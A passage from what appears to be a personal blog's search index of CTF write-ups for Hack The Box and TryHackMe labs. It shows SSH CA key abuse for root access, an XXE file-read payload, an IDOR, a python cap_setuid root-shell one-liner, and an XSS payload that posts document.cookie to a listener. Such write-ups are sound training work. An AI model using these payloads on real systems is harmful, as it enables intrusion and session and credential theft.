2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/ssh/sshd_config.d/60-principal.conf</span><br><span class="line">/opt/principal/ssh</span><br><span class="line">/opt/principal/ssh/README.txt</span><br><span class="line">/opt/principal/ssh/ca</span><br></pre></td></tr></table></figure><p>The important finding was the SSH certificate authority key at:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/principal/ssh/ca</span><br></pre></td></tr></table></figure><p>Because the current user could access the CA key, I could sign my own SSH key and create a certificate valid for the <code>root</code> principal.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">ssh-keygen -t ed25519 -f ./pwn -N <span class="string">&quot;&quot;</span> -C pwn</span><br><span class="line">ssh-keygen -s /opt/principal/ssh/ca -I pwn-root -n root -V +10m ./pwn.pub</span><br><span class="line">ssh -i ./pwn -o CertificateFile=./pwn-cert.pub root@localhost</span><br></pre></td></tr></table></figure><p>That certificate was accepted by SSH, giving a root shell.</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Attacks - Writeup</title>
      <link href="/2026/05/08/2026-05-08-Web-Attacks-Skill-Assessment/"/>
      <url>/2026/05/08/2026-05-08-Web-Attacks-Skill-Assessment/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-Attacks-—-Skill-Assessment-Writeup"><a href="#Web-Attacks-—-Skill-Assessment-Writeup" class="headerlink" title="Web Attacks — Skill Assessment Writeup"></a>Web Attacks — Skill Assessment Writeup</h1><h2 id="Step-1-IDOR-—-User-Enumeration"><a href="#Step-1-IDOR-—-User-Enumeration" class="headerlink" title="Step 1: IDOR — User Enumeration"></a>Step 1: IDOR — User Enumeration</h2><p>The application manages sessions using a <code>uid</code> cookie. Modifying this value allows impersonating other users.</p><p>While browsing profiles, an API call fetches user data via a URL parameter:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/user?id=52</span><br></pre></td></tr></table></figure><p>Using Burp Suite Intruder (Battering Ram) to enumerate user IDs and filtering responses for <code>Administrator</code> with <code>grep</code>:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;52&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a.corrales&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;full_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Amor Corrales&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;company&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Administrator&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Step-2-Understand-the-password-reset-flow"><a href="#Step-2-Understand-the-password-reset-flow" class="headerlink" title="Step 2: Understand the password-reset flow"></a>Step 2: Understand the password-reset flow</h2><p>The password reset function calls two endpoints:</p><ul><li>GET &#x2F;api.php&#x2F;token&#x2F;52</li><li>POST &#x2F;reset.php</li></ul><p>The first endpoint provides a token which we will need for the second one - the second endpoint is a POST request with the following body:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=52&amp;token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&amp;password=test</span><br></pre></td></tr></table></figure><p>However after trying, we get a Access denied…</p><hr><h2 id="Step-3-HTTP-Verb-Tampering-—-Admin-Password-Reset"><a href="#Step-3-HTTP-Verb-Tampering-—-Admin-Password-Reset" class="headerlink" title="Step 3: HTTP Verb Tampering — Admin Password Reset"></a>Step 3: HTTP Verb Tampering — Admin Password Reset</h2><p>The password reset endpoint only restricted specific HTTP methods. Switching the verb allowed resetting the admin password.</p><hr><h2 id="Step-4-XXE-—-Local-File-Read"><a href="#Step-4-XXE-—-Local-File-Read" class="headerlink" title="Step 4: XXE — Local File Read"></a>Step 4: XXE — Local File Read</h2><p>Logged in as admin, the Add Event feature sends an XML body:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>event name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">details</span>&gt;</span>event details<span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">date</span>&gt;</span>2026-05-13<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The <code>&lt;name&gt;</code> field is reflected in the response. Using a PHP filter wrapper to base64-encode file contents avoids issues with newlines and special characters breaking reflection:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">details</span>&gt;</span>details<span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">date</span>&gt;</span>date<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Event &#x27;&lt;base64string&gt;&#x27; has been created.</span><br></pre></td></tr></table></figure><p>Decode:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;base64string&gt;&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cup - CTF Writeup</title>
      <link href="/2026/05/04/2026-05-04-CupCTF/"/>
      <url>/2026/05/04/2026-05-04-CupCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Writeup-—-HTB-Machine-10-129-48-150"><a href="#CTF-Writeup-—-HTB-Machine-10-129-48-150" class="headerlink" title="CTF Writeup — HTB Machine (10.129.48.150)"></a>CTF Writeup — HTB Machine (10.129.48.150)</h1><hr><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>A full port scan was conducted against the target to enumerate open services.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -sV -p- 10.129.48.150</span><br></pre></td></tr></table></figure><p><strong>Results:</strong></p><table><thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21&#x2F;tcp</td><td>open</td><td>ftp</td><td>vsftpd 3.0.3</td></tr><tr><td>22&#x2F;tcp</td><td>open</td><td>ssh</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td></tr><tr><td>80&#x2F;tcp</td><td>open</td><td>http</td><td>Gunicorn (Security Dashboard)</td></tr></tbody></table><p>The target is running Linux 5.0–5.14, reachable via 2 hops (RTT ~11ms).</p><hr><h2 id="Web-Enumeration-—-IDOR"><a href="#Web-Enumeration-—-IDOR" class="headerlink" title="Web Enumeration — IDOR"></a>Web Enumeration — IDOR</h2><p>Navigating to <code>http://10.129.48.150/</code> presents a Security Dashboard web application.</p><p>The download endpoint was found to be vulnerable to <strong>Insecure Direct Object Reference (IDOR)</strong> — packet capture files belonging to other users could be accessed by simply manipulating the numeric ID in the URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.48.150/download/0</span><br></pre></td></tr></table></figure><p>Downloading the PCAP file at index <code>0</code> and opening it in Wireshark revealed credentials in cleartext within the captured traffic.</p><p><img src="/Pasted%20image%2020260504203643.png" alt="Wireshark capture showing credentials"></p><hr><h2 id="Initial-Access-—-SSH"><a href="#Initial-Access-—-SSH" class="headerlink" title="Initial Access — SSH"></a>Initial Access — SSH</h2><p>Using the credentials extracted from the PCAP file, SSH access was obtained:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;user&gt;@10.129.48.150</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation-—-Python-Capabilities"><a href="#Privilege-Escalation-—-Python-Capabilities" class="headerlink" title="Privilege Escalation — Python Capabilities"></a>Privilege Escalation — Python Capabilities</h2><p>With a foothold on the machine, Linux capabilities were enumerated across the filesystem:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><strong>Output:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3.8 = cap_setuid+ep</span><br></pre></td></tr></table></figure><p>The <code>cap_setuid</code> capability on <code>python3.8</code> allows the binary to arbitrarily set its UID — including to <code>0</code> (root) — without needing a SUID bit. This is a well-known GTFOBins escalation path.</p><p>The following one-liner was used to escalate to root:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3.8 -c <span class="string">&#x27;import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>A root shell was obtained.</p><hr><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><table><thead><tr><th>Step</th><th>Technique</th></tr></thead><tbody><tr><td>Recon</td><td>Nmap full port scan</td></tr><tr><td>Foothold</td><td>IDOR on <code>/download/&lt;id&gt;</code> — cleartext credentials in PCAP</td></tr><tr><td>Privesc</td><td>Python3.8 <code>cap_setuid</code> capability abuse (GTFOBins)</td></tr></tbody></table><hr><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul><li><strong>IDOR vulnerabilities</strong> can expose sensitive files belonging to other users when object references are predictable and access controls are absent.</li><li><strong>Capabilities</strong> are a subtle but dangerous misconfiguration — <code>cap_setuid</code> on an interpreter is effectively equivalent to SUID root.</li><li>Always enumerate capabilities alongside SUID binaries during privilege escalation.</li></ul>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cupid&#39;s matchmaker - CTF Writeup</title>
      <link href="/2026/05/02/2026-05-02-Cupids-matchmaker/"/>
      <url>/2026/05/02/2026-05-02-Cupids-matchmaker/</url>
      
        <content type="html"><![CDATA[<p>After inspecting the site, one small detail in the Survey stood out:<br><em><strong>Our team reads every word! Be creative and specific.</strong></em><br>when reading this i instantly thought about XSS.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line">fetch(&#x27;http://localhost:8000&#x27;, &#123;  </span><br><span class="line">method: &#x27;POST&#x27;,  </span><br><span class="line">mode: &#x27;no-cors&#x27;,  </span><br><span class="line">body:document.cookie  </span><br><span class="line">&#125;);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>this is a very simple payload which requires the site to have no real input validation.<br>I set up a python3 webserver using the following code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from http.server import HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class PostHandler(SimpleHTTPRequestHandler):</span><br><span class="line">    def do_POST(self):</span><br><span class="line">        content_length = int(self.headers[&#x27;Content-Length&#x27;])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        </span><br><span class="line">        # Log the POST data</span><br><span class="line">        print(f&quot;POST request received:&quot;)</span><br><span class="line">        print(f&quot;Path: &#123;self.path&#125;&quot;)</span><br><span class="line">        print(f&quot;Headers: &#123;self.headers&#125;&quot;)</span><br><span class="line">        print(f&quot;Body: &#123;post_data.decode(&#x27;utf-8&#x27;)&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        # Send response</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-type&#x27;, &#x27;application/json&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        </span><br><span class="line">        response = &#123;&#x27;status&#x27;: &#x27;success&#x27;, &#x27;received&#x27;: post_data.decode(&#x27;utf-8&#x27;)&#125;</span><br><span class="line">        self.wfile.write(json.dumps(response).encode())</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    server = HTTPServer((&#x27;localhost&#x27;, 8000), PostHandler)</span><br><span class="line">    print(&#x27;Server running on http://localhost:8000&#x27;)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>to get the flag all i had to do is start the webserver by running: <em><strong>python3 server.py</strong></em><br>and sent the payload via the survey.</p><p>at the end i got the flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Body: flag=THM&#123;XSS_CuP1d_Str1k3s_Ag41n&#125;</span><br><span class="line">10.66.169.156 - - [15/Feb/2026 09:45:15] &quot;POST / HTTP/1.1&quot; 200 -</span><br><span class="line">POST request received:</span><br><span class="line">Path: /</span><br><span class="line">Headers: Host: 192.168.134.175:8000</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 33</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://localhost:5000</span><br><span class="line">Referer: http://localhost:5000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
            <tag> web-security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to Hack The Box Notes</title>
      <link href="/2026/05/01/2026-05-01-welcome-hackthebox/"/>
      <url>/2026/05/01/2026-05-01-welcome-hackthebox/</url>
      
        <content type="html"><![CDATA[<p>This category is for my <strong>Hack The Box</strong> notes, machine writeups, and training progress.</p><p>Future posts here can include box walkthroughs, enumeration notes, and lessons learned.</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to TryHackMe Notes</title>
      <link href="/2026/05/01/2026-05-01-welcome/"/>
      <url>/2026/05/01/2026-05-01-welcome/</url>
      
        <content type="html"><![CDATA[<p>This category is for my <strong>TryHackMe</strong> notes, walkthroughs, and learning progress.</p><p>Future posts here can include room notes, takeaways, and short writeups.</p>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to PortSwigger Notes</title>
      <link href="/2026/05/01/2026-05-01-welcome-portswigger/"/>
      <url>/2026/05/01/2026-05-01-welcome-portswigger/</url>
      
        <content type="html"><![CDATA[<p>This category is for my <strong>PortSwigger</strong> Academy notes, lab references, and web security learning.</p><p>Future posts here can include lab summaries, exploitation notes, and useful techniques.</p>]]></content>
      
      
      <categories>
          
          <category> portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-security </tag>
            
            <tag> portswigger </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
